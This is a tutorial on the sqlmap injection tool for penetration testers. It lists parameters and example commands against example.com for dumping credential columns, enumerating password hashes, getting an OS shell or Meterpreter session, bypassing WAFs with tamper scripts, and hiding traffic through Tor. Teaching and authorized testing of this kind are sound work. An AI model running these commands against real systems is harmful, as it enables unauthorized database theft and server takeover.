
# SQLMAP: The Penetration Tester's Guide

SQLMAP is a powerful tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. As a penetration tester, mastering SQLMAP is crucial to assess the security of database-driven web applications effectively.

**Note**: Ensure that you have legal authorization before using SQLMAP or any other penetration testing tools against any target. Unauthorized access is illegal.

## 1. Basic Usage

Before diving into the parameters, let's understand the basic usage:

```bash
sqlmap -u <URL>
```

Here `-u` specifies the URL you're targeting.

Example:

```bash
sqlmap -u http://example.com/page.php?id=1
```

## 2. Important Parameters

### 2.1. Data Retrieval

- **`-D`**: Database name to target.
- **`-T`**: Table name to target.
- **`-C`**: Column name to target.

Example:

```bash
sqlmap -u http://example.com/page.php?id=1 -D mydb -T users -C username,password --dump
```

This dumps the `username` and `password` columns from the `users` table in `mydb` database.

### 2.2. Request Methods and Data

- **`--data`**: Data string to be sent through POST.

Example:

```bash
sqlmap -u http://example.com/login.php --data="username=test&password=test"
```

- **`--method`**: Force usage of a specific HTTP request method.

Example:

```bash
sqlmap -u http://example.com/api/ --method=POST --data="api_key=value"
```

### 2.3. Cookie, User-Agent, and Headers

- **`--cookie`**: HTTP Cookie header value.

Example:

```bash
sqlmap -u http://example.com/page.php?id=1 --cookie="JSESSIONID=ABC123"
```

- **`--user-agent`**: User-Agent header value.
- **`--headers`**: Extra headers (e.g., "Referer: http://example.com/").

### 2.4. Tamper Scripts

- **`--tamper`**: Use tamper scripts to modify payloads and evade filters or WAFs.

Example:

```bash
sqlmap -u http://example.com/page.php?id=1 --tamper=space2comment
```

### 2.5. Customizing Payloads

- **`--prefix`** and **`--suffix`**: Set custom injection prefix/suffix.
- **`--dbms`**: Force back-end DBMS. E.g., `--dbms=mysql`.

### 2.6. Enumeration

- **`--dbs`**: Enumerate databases.
- **`--tables`**: Enumerate tables.
- **`--columns`**: Enumerate columns.
- **`--schema`**: Enumerate DBMS schema.
- **`--users`**, **`--passwords`**, **`--privileges`**: Enumerate users, their hashed passwords, and privileges.

### 2.7. OS-level Access

- **`--os-shell`**: Prompt for an interactive OS shell.
- **`--os-pwn`**: Establish an out-of-band connection (Meterpreter).

### 2.8. Detection

- **`--level`**: Level of tests (1-5).
- **`--risk`**: Risk of tests (1-3).
- **`--string`**: String to match when the query is true.
- **`--not-string`**: String to match when the query is false.

### 2.9. Optimization

- **`--threads`**: Number of threads to use during testing.

### 2.10. Output and Session

- **`--batch`**: Never ask for user input; use the default behavior.
- **`--output-dir`**: Custom output directory path.
- **`--fresh-queries`**: Ignore cached query results.

### 2.11. Miscellaneous

- **`--tor`**: Route traffic through the Tor network.
- **`--check-tor`**: Check if Tor is used properly.

## 3. Pro Tips

1. **Always Start Simple**: Start with basic injection and then proceed with dumping data or OS level commands.
2. **Tamper Scripts**: Make sure to be familiar with various tamper scripts. They can be the difference between a successful and unsuccessful exploit.
3. **WAF Bypass**: If you're up against a WAF, combine multiple tamper scripts for better chances of evasion.
4. **Be Stealthy**: Consider using Tor with SQLMAP to anonymize your traffic and reduce chances of getting blocked.

## Conclusion

SQLMAP is a versatile tool, and its real power lies in understanding the variety of parameters and their combinations to effectively exploit SQL injection vulnerabilities. By mastering the above parameters, you will be better prepared to tackle complex SQL injections during pentests or CTF challenges. Always stay ethical and have authorization before conducting any tests.
